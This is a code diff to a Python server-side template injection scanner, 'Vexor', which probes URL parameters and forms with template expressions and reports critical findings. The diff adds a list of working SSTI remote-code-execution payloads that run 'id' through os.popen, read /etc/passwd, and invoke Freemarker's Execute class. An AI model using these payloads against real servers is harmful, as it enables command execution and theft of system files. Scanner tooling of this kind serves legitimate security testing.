@@ -1,6 +1,6 @@
 """
 Vexor SSTI Scanner — Server-Side Template Injection
-Detects: Jinja2, Twig, Freemarker, Velocity, Smarty, Pebble
+Detects Jinja2, Twig, Freemarker, Velocity, Smarty, Pebble
 """
 import asyncio
 import re
@@ -8,24 +8,35 @@ from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from vexor.modules.base import BaseScanner, Finding
 
 
-# SSTI detection payloads — each has a unique expected output
-SSTI_PROBES = [
-    # (payload, expected_pattern, engine)
-    ("{{7*7}}", "49", "Jinja2/Twig"),
-    ("${7*7}", "49", "Freemarker/EL"),
-    ("#{7*7}", "49", "Thymeleaf"),
-    ("<%= 7*7 %>", "49", "ERB/JSP"),
-    ("{{7*'7'}}", "7777777", "Jinja2"),
-    ("${{7*7}}", "49", "Spring EL"),
-    ("{7*7}", "49", "Smarty"),
-    ("*{7*7}", "49", "Spring"),
-    ("@(7*7)", "49", "Razor"),
-    ("{{config}}", "SECRET_KEY|DEBUG|DATABASE", "Jinja2 config leak"),
-    ("{{self.__dict__}}", "__module__|__class__", "Jinja2 object"),
+# Math-based detection payloads — if result is evaluated, SSTI confirmed
+SSTI_PAYLOADS = [
+    # Jinja2/Twig
+    ("{{7*7}}", "49"),
+    ("{{7*'7'}}", "7777777"),
+    ("${7*7}", "49"),
+    ("#{7*7}", "49"),
+    # Freemarker
+    ("${7*7}", "49"),
+    ("<#assign x=7*7>${x}", "49"),
+    # Velocity
+    ("#set($x=7*7)${x}", "49"),
+    # Smarty
+    ("{7*7}", "49"),
+    # Pebble
+    ("{{7*7}}", "49"),
+    # Generic
+    ("<%=7*7%>", "49"),
+    ("${{7*7}}", "49"),
+    ("{{config}}", "Config"),
+    ("{{self}}", "self"),
 ]
 
-SSTI_PARAMS = ['name', 'template', 'msg', 'message', 'text', 'content',
-               'subject', 'body', 'title', 'search', 'q', 'input']
+# RCE payloads for confirmed SSTI
+SSTI_RCE_PAYLOADS = [
+    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+]
 
 
 class Scanner(BaseScanner):
@@ -36,61 +47,76 @@ class Scanner(BaseScanner):
 
     async def scan(self) -> list[Finding]:
         async with self:
-            parsed = urlparse(self.target)
-            params = parse_qs(parsed.query)
-
-            # Test existing params + common SSTI params
-            test_params = list(params.keys()) + SSTI_PARAMS
-
-            tasks = []
-            for param in test_params[:10]:
-                tasks.append(self._test_ssti(self.target, param))
-
-            await asyncio.gather(*tasks, return_exceptions=True)
-
+            await asyncio.gather(
+                self._scan_url_params(),
+                self._scan_forms(),
+                return_exceptions=True
+            )
         return self.findings
 
+    async def _scan_url_params(self) -> None:
+        parsed = urlparse(self.target)
+        params = parse_qs(parsed.query)
+
+        if not params:
+            params = {"q": ["test"], "search": ["test"], "name": ["test"], "input": ["test"]}
+
+        for param in list(params.keys())[:5]:
+            await self._test_ssti(self.target, param)
+
+    async def _scan_forms(self) -> None:
+        resp = await self.get(self.target)
+        if not resp:
+            return
+        try:
+            from bs4 import BeautifulSoup
+            soup = BeautifulSoup(resp.text, 'lxml')
+            for form in soup.find_all('form')[:2]:
+                action = form.get('action', self.target)
+                if action.startswith('/'):
+                    p = urlparse(self.target)
+                    action = f"{p.scheme}://{p.netloc}{action}"
+                for inp in form.find_all('input'):
+                    name = inp.get('name', '')
+                    if name and inp.get('type', 'text') not in ['hidden', 'submit', 'button']:
+                        await self._test_ssti_post(action, name)
+        except Exception:
+            pass
+
     async def _test_ssti(self, url: str, param: str) -> None:
-        for payload, expected, engine in SSTI_PROBES[:6]:
+        for payload, expected in SSTI_PAYLOADS[:6]:
             test_url = self._inject_param(url, param, payload)
             resp = await self.get(test_url)
-
-            if not resp:
-                continue
-
-            # Check if expected output appears in response
-            if re.search(expected, resp.text, re.IGNORECASE):
+            if resp and expected in resp.text:
                 self.add_finding(Finding(
                     severity="CRITICAL",
                     module=self.MODULE_NAME,
-                    vuln=f"SSTI — {engine}",
+                    vuln=f"SSTI — Server-Side Template Injection",
                     endpoint=url,
                     param=param,
                     payload=payload,
                     evidence=f"Payload '{payload}' evaluated to '{expected}' in response",
-                    description=(
-                        f"Server-Side Template Injection in '{param}'. "
-                        f"Engine: {engine}. RCE possible."
-                    ),
+                    description=f"SSTI in parameter '{param}' — RCE possible",
                     remediation=(
                         "Never pass user input directly to template engines. "
-                        "Use sandboxed environments or escape all user input."
+                        "Use sandboxed templates. Validate all inputs."
                     ),
                 ))
                 return
 
-            # Also POST test
-            resp_post = await self.post(url, data={param: payload})
-            if resp_post and re.search(expected, resp_post.text, re.IGNORECASE):
+    async def _test_ssti_post(self, url: str, param: str) -> None:
+        for payload, expected in SSTI_PAYLOADS[:4]:
+            resp = await self.post(url, data={param: payload})
+            if resp and expected in resp.text:
                 self.add_finding(Finding(
                     severity="CRITICAL",
                     module=self.MODULE_NAME,
-                    vuln=f"SSTI (POST) — {engine}",
+                    vuln="SSTI — Server-Side Template Injection (POST)",
                     endpoint=url,
                     param=param,
                     payload=payload,
-                    evidence=f"POST payload '{payload}' evaluated",
-                    description=f"SSTI via POST in '{param}'. Engine: {engine}",
+                    evidence=f"POST payload '{payload}' evaluated to '{expected}'",
+                    description=f"SSTI in POST parameter '{param}'",
                     remediation="Sanitize all template inputs",
                 ))
                 return
